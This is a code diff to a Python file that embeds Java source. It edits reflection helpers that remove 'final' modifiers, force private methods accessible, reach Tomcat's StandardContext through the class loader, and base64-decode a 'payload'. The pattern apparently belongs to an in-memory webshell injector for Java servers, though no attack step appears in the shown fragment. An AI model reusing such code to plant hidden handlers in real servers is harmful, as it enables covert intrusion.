@@ -21,7 +21,12 @@ code = """
             }
         }
         if (field != null) {
-            field.setAccessible(true);
+            try {
+                Field mf = Field.class.getDeclaredField("modifiers");
+                mf.setAccessible(true);
+                mf.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+                field.setAccessible(true);
+            } catch (Exception e) {}
         }
         return field;
     }
@@ -77,7 +82,6 @@ code = """
                 } else {
                     clazzs.add(null);
                 }
-
             }
         }
         Method method = getMethod(
@@ -85,6 +89,7 @@ code = """
             (Class[]) clazzs.toArray(new Class[]{})
         );
         try {
+            method.setAccessible(true);
             return method.invoke(obj, args);
         } catch (Exception e) {
             return null;
@@ -95,20 +100,13 @@ code = """
         return Thread.currentThread().getContextClassLoader();
     }
 
-    private Object getStandardContext() {
-        return invokeMethod(
-            getFieldValue(getLoader(), "resources"),
-            "getContext"
-        );
-    }
-
     private byte[] b64decode(String payload) {
         Class base64;
         byte[] bytes = null;
         try {
             base64 = Class.forName("java.util.Base64");
             bytes = (byte[]) invokeMethod(
-                getMethodX(base64, "getDecoder", 0).invoke(base64, null),
+                getMethod(base64, "getDecoder").invoke(base64),
                 "decode", payload
             );
         } catch (ClassNotFoundException e) {
